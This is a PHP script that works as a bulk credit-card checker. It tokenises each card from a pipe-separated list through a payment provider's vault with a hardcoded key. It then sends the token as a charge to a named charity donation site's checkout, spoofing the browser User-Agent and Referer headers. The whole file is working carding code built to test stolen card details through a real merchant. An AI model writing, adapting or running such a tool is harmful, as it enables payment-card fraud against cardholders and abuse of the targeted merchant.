<?php

// Function to make a POST request
function makePostRequest($url, $headers, $data) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Function to check a single credit card
function checkCard($ccNumber, $expMonth, $expYear, $cvv) {
    $tokenUrl = "https://vault.omise.co/tokens";
    $checkoutUrl = "https://givenow.gb.org.sg/index.php?route=extension/payment/omise/checkout";

    // Step 1: Create a token using the card details
    $cardData = array(
        "card" => array(
            "name" => "Test User",
            "number" => $ccNumber,
            "expiration_month" => $expMonth,
            "expiration_year" => $expYear,
            "security_code" => $cvv
        )
    );
    $jsonCardData = json_encode($cardData);

    // Headers for the token request
    $tokenHeaders = array(
        'Content-Type: application/json',
        'Authorization: Basic cGtleV81b2wzanF0ZW16ZHJwemM2OXV6Og==',
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
    );

    $tokenResponse = makePostRequest($tokenUrl, $tokenHeaders, $jsonCardData);
    $tokenData = json_decode($tokenResponse, true);

    if (isset($tokenData['id'])) {
        $omiseToken = $tokenData['id'];

        // Step 2: Use the token to attempt a checkout
        $checkoutData = http_build_query(array(
            'omise_token' => $omiseToken,
            'description' => 'Charge a card from OpenCart'
        ));

        // Headers for the checkout request
        $checkoutHeaders = array(
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With: XMLHttpRequest',
            'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
            'Referer: https://givenow.gb.org.sg/checkout'
        );

        $checkoutResponse = makePostRequest($checkoutUrl, $checkoutHeaders, $checkoutData);
        return json_decode($checkoutResponse, true);
    } else {
        return array("status" => "error", "message" => "Token creation failed", "details" => $tokenData);
    }
}

// Function to process multiple credit cards
function checkMultipleCards($cards) {
    $results = [];
    foreach ($cards as $card) {
        list($ccNumber, $expMonth, $expYear, $cvv) = explode('|', $card);
        $result = checkCard(trim($ccNumber), trim($expMonth), trim($expYear), trim($cvv));
        $results[] = $result;
    }
    return $results;
}

// Input: List of cards
$cardsInput = "4147098457625952|09|2027|036\n4147098457625953|10|2026|123\n4147098457625954|08|2028|456";
$cards = explode("\n", $cardsInput);

// Process the cards
$results = checkMultipleCards($cards);

// Output the results
header('Content-Type: application/json');
echo json_encode($results, JSON_PRETTY_PRINT);

?>
